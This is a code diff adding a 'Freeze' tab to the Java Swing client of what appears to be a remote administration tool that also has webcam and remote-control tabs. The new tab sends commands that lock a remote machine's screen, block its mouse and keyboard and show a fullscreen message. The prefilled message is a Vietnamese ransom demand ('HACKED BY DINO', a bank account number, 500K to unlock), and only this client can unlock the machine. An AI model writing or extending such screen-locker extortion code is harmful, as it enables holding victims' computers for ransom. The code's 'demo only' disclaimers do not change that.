@@ -135,6 +135,7 @@ public class ClientGUI extends JFrame {
         tabs.addTab("Webcam",        buildWebcamTab());
         tabs.addTab("Dieu khien xa", buildRemoteTab());
         tabs.addTab("Mang/Chan doan", buildNetDiagTab());
+        tabs.addTab("🔒 Freeze",     buildFreezeTab());
         return tabs;
     }
 
@@ -1149,6 +1150,189 @@ public class ClientGUI extends JFrame {
         root.add(s1);
         root.add(s2);
         root.add(s3);
+        return root;
+    }
+
+    // ════════════════════════════════════════════
+    //  TAB 10: FREEZE SCREEN
+    // ════════════════════════════════════════════
+    private JPanel buildFreezeTab() {
+        JPanel root = new JPanel(new BorderLayout(8, 8));
+        root.setBorder(new EmptyBorder(8, 8, 8, 8));
+
+        // ── Main Panel ──
+        JPanel mainPanel = new JPanel();
+        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));
+        mainPanel.setBorder(BorderFactory.createTitledBorder("🔒 Freeze Screen - Dong bang man hinh server"));
+
+        // Warning message
+        JPanel warningPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
+        JLabel warningIcon = new JLabel("⚠️");
+        warningIcon.setFont(new Font("Segoe UI Emoji", Font.PLAIN, 40));
+        warningPanel.add(warningIcon);
+
+        JTextArea warningText = new JTextArea(
+            "CANH BAO: Tinh nang nay se:\n" +
+            "• Dong bang toan bo man hinh server\n" +
+            "• Block chuot va ban phim\n" +
+            "• Hien thi thong bao fullscreen\n" +
+            "• Chi co the mo khoa tu client nay\n\n" +
+            "CHI su dung cho muc dich:\n" +
+            "✓ Giao duc / Demo bao mat\n" +
+            "✓ Testing voi su dong y\n" +
+            "✗ KHONG su dung cho muc dich xau"
+        );
+        warningText.setEditable(false);
+        warningText.setBackground(new Color(0xFFF3CD));
+        warningText.setForeground(new Color(0x856404));
+        warningText.setFont(new Font("Arial", Font.PLAIN, 13));
+        warningText.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
+        warningPanel.add(warningText);
+        mainPanel.add(warningPanel);
+
+        mainPanel.add(Box.createVerticalStrut(15));
+
+        // Message editor
+        JPanel msgPanel = new JPanel(new BorderLayout(4, 4));
+        msgPanel.setBorder(BorderFactory.createTitledBorder("Thong bao hien thi tren server"));
+
+        JTextArea msgArea = new JTextArea(4, 40);
+        msgArea.setText("HACKED BY DINO\nVCB 0123456\n500K de mo khoa");
+        msgArea.setFont(new Font("Arial", Font.BOLD, 14));
+        msgArea.setLineWrap(true);
+        msgArea.setWrapStyleWord(true);
+        JScrollPane msgScroll = new JScrollPane(msgArea);
+        msgPanel.add(msgScroll, BorderLayout.CENTER);
+
+        JLabel msgHint = new JLabel("💡 Moi dong se hien thi rieng biet. Su dung \\n de xuong dong.");
+        msgHint.setFont(new Font("Arial", Font.PLAIN, 11));
+        msgHint.setForeground(Color.GRAY);
+        msgPanel.add(msgHint, BorderLayout.SOUTH);
+
+        mainPanel.add(msgPanel);
+
+        mainPanel.add(Box.createVerticalStrut(15));
+
+        // Control buttons
+        JPanel btnPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 5));
+
+        // Freeze button
+        JButton freezeBtn = new JButton("🔒 FREEZE SCREEN");
+        freezeBtn.setFont(new Font("Arial", Font.BOLD, 16));
+        freezeBtn.setBackground(new Color(0xDC3545)); // Red
+        freezeBtn.setForeground(Color.WHITE);
+        freezeBtn.setOpaque(true);
+        freezeBtn.setBorderPainted(false);
+        freezeBtn.setFocusPainted(false);
+        freezeBtn.setPreferredSize(new Dimension(200, 50));
+        freezeBtn.addActionListener(e -> {
+            String msg = msgArea.getText().trim();
+            if (msg.isEmpty()) {
+                showErr("Vui long nhap thong bao!");
+                return;
+            }
+
+            int confirm = JOptionPane.showConfirmDialog(this,
+                "Ban chac chan muon FREEZE man hinh server?\n" +
+                "Server se bi dong bang toan bo!\n" +
+                "Chi co the mo khoa tu client nay.",
+                "Xac nhan Freeze",
+                JOptionPane.YES_NO_OPTION,
+                JOptionPane.WARNING_MESSAGE);
+
+            if (confirm == JOptionPane.YES_OPTION) {
+                runTask(() -> {
+                    conn.sendCommand(JsonUtil.buildCommand("FREEZE_SCREEN", "message", msg));
+                    String response = extract(conn.readTextResponse());
+                    log("FREEZE: " + response);
+                    SwingUtilities.invokeLater(() ->
+                        JOptionPane.showMessageDialog(this,
+                            "✓ Server da bi FREEZE!\n\n" + response,
+                            "Freeze Thanh Cong",
+                            JOptionPane.INFORMATION_MESSAGE)
+                    );
+                });
+            }
+        });
+        btnPanel.add(freezeBtn);
+
+        // Unfreeze button
+        JButton unfreezeBtn = new JButton("🔓 UNFREEZE (Mo khoa)");
+        unfreezeBtn.setFont(new Font("Arial", Font.BOLD, 16));
+        unfreezeBtn.setBackground(new Color(0x28A745)); // Green
+        unfreezeBtn.setForeground(Color.WHITE);
+        unfreezeBtn.setOpaque(true);
+        unfreezeBtn.setBorderPainted(false);
+        unfreezeBtn.setFocusPainted(false);
+        unfreezeBtn.setPreferredSize(new Dimension(200, 50));
+        unfreezeBtn.addActionListener(e -> {
+            runTask(() -> {
+                conn.sendCommand(JsonUtil.buildCommand("UNFREEZE_SCREEN"));
+                String response = extract(conn.readTextResponse());
+                log("UNFREEZE: " + response);
+                SwingUtilities.invokeLater(() ->
+                    JOptionPane.showMessageDialog(this,
+                        "✓ Server da duoc mo khoa!\n\n" + response,
+                        "Unfreeze Thanh Cong",
+                        JOptionPane.INFORMATION_MESSAGE)
+                );
+            });
+        });
+        btnPanel.add(unfreezeBtn);
+
+        // Check status button
+        JButton checkBtn = new JButton("🔍 Kiem tra trang thai");
+        checkBtn.setFont(new Font("Arial", Font.PLAIN, 13));
+        checkBtn.setBackground(new Color(0x007BFF)); // Blue
+        checkBtn.setForeground(Color.WHITE);
+        checkBtn.setOpaque(true);
+        checkBtn.setBorderPainted(false);
+        checkBtn.setFocusPainted(false);
+        checkBtn.addActionListener(e -> {
+            runTask(() -> {
+                conn.sendCommand(JsonUtil.buildCommand("CHECK_FREEZE_STATUS"));
+                String response = extract(conn.readTextResponse());
+                log("CHECK FREEZE: " + response);
+                String status = response.equals("FROZEN") ? "🔒 FROZEN (Dang dong bang)" : "🔓 NORMAL (Binh thuong)";
+                SwingUtilities.invokeLater(() ->
+                    JOptionPane.showMessageDialog(this,
+                        "Trang thai hien tai:\n" + status,
+                        "Trang Thai Server",
+                        JOptionPane.INFORMATION_MESSAGE)
+                );
+            });
+        });
+        btnPanel.add(checkBtn);
+
+        mainPanel.add(btnPanel);
+
+        // Info panel
+        JPanel infoPanel = new JPanel(new BorderLayout());
+        infoPanel.setBorder(BorderFactory.createTitledBorder("ℹ️ Thong tin"));
+
+        JTextArea infoText = new JTextArea(
+            "CO CHE HOAT DONG:\n" +
+            "1. Client gui lenh FREEZE_SCREEN den server\n" +
+            "2. Server tao fullscreen window voi thong bao\n" +
+            "3. Server block tat ca mouse/keyboard input\n" +
+            "4. Chi client nay moi co the gui lenh UNFREEZE\n\n" +
+            "CACH SU DUNG:\n" +
+            "• Nhap thong bao (co the nhieu dong)\n" +
+            "• Bam 'FREEZE SCREEN'\n" +
+            "• De mo khoa: Bam 'UNFREEZE'\n\n" +
+            "LUU Y BAO MAT:\n" +
+            "⚠️  Tinh nang nay CHI de demo/giao duc\n" +
+            "⚠️  KHONG lam dung cho muc dich toi pham\n" +
+            "⚠️  Luon co su dong y cua nguoi su dung server"
+        );
+        infoText.setEditable(false);
+        infoText.setFont(new Font("Monospaced", Font.PLAIN, 11));
+        infoText.setBackground(new Color(0xF8F9FA));
+        infoPanel.add(new JScrollPane(infoText), BorderLayout.CENTER);
+
+        root.add(mainPanel, BorderLayout.NORTH);
+        root.add(infoPanel, BorderLayout.CENTER);
+
         return root;
     }
 
